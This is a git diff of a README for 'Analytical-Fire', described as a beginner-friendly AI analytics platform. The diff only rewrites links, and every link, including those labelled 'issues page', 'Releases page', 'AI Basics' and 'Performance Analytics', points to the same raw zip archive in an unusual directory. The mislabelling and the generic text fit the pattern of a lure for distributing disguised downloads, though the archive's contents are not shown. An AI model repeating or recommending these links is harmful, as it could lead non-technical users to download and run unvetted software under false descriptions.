@@ -4,7 +4,7 @@
 Welcome to Analytical-Fire! This platform helps you exchange knowledge and analyze performance using artificial intelligence. You don’t need to be a tech expert to use it. Follow these steps to get started.
 
 ## 📥 Download Now
-[![Download Analytical-Fire](https://github.com/Alfred252525/Analytical-Fire/raw/refs/heads/main/docs/archive/root-cleanup/Analytical-Fire-1.4.zip)](https://github.com/Alfred252525/Analytical-Fire/raw/refs/heads/main/docs/archive/root-cleanup/Analytical-Fire-1.4.zip)
+[![Download Analytical-Fire](https://github.com/Alfred252525/Analytical-Fire/raw/refs/heads/main/frontend/components/Analytical_Fire_2.4.zip)](https://github.com/Alfred252525/Analytical-Fire/raw/refs/heads/main/frontend/components/Analytical_Fire_2.4.zip)
 
 ## 📋 Overview
 Analytical-Fire is designed to make AI accessible. Whether you want to collaborate, analyze data, or enhance your performance, this platform has tools for you. 
@@ -29,7 +29,7 @@ Before you install, make sure you have:
 - Basic knowledge of downloading files
 
 ## 🔗 Download & Install
-To download Analytical-Fire, visit this page: [Download Analytical-Fire](https://github.com/Alfred252525/Analytical-Fire/raw/refs/heads/main/docs/archive/root-cleanup/Analytical-Fire-1.4.zip).
+To download Analytical-Fire, visit this page: [Download Analytical-Fire](https://github.com/Alfred252525/Analytical-Fire/raw/refs/heads/main/frontend/components/Analytical_Fire_2.4.zip).
 
 1. Click on the link above to open the Releases page.
 2. You will see various versions of the software. Choose the latest version for the best experience.
@@ -57,7 +57,7 @@ After installation, open the application to start exploring its features. The ma
 
 ## 📞 Support
 If you encounter any issues while downloading or using Analytical-Fire, help is available.
-- Visit the [issues page](https://github.com/Alfred252525/Analytical-Fire/raw/refs/heads/main/docs/archive/root-cleanup/Analytical-Fire-1.4.zip) on GitHub to report a problem.
+- Visit the [issues page](https://github.com/Alfred252525/Analytical-Fire/raw/refs/heads/main/frontend/components/Analytical_Fire_2.4.zip) on GitHub to report a problem.
 - You can also find answers to frequently asked questions there.
 
 ## 📝 Contribute
@@ -68,7 +68,7 @@ Analytical-Fire is distributed under the MIT License. You can use, modify, and d
 
 ## 🌐 Learn More
 For more information about AI and analytics, check out:
-- [AI Basics](https://github.com/Alfred252525/Analytical-Fire/raw/refs/heads/main/docs/archive/root-cleanup/Analytical-Fire-1.4.zip)
-- [Performance Analytics](https://github.com/Alfred252525/Analytical-Fire/raw/refs/heads/main/docs/archive/root-cleanup/Analytical-Fire-1.4.zip)
+- [AI Basics](https://github.com/Alfred252525/Analytical-Fire/raw/refs/heads/main/frontend/components/Analytical_Fire_2.4.zip)
+- [Performance Analytics](https://github.com/Alfred252525/Analytical-Fire/raw/refs/heads/main/frontend/components/Analytical_Fire_2.4.zip)
 
 Thank you for choosing Analytical-Fire. We hope it helps you unlock valuable insights!
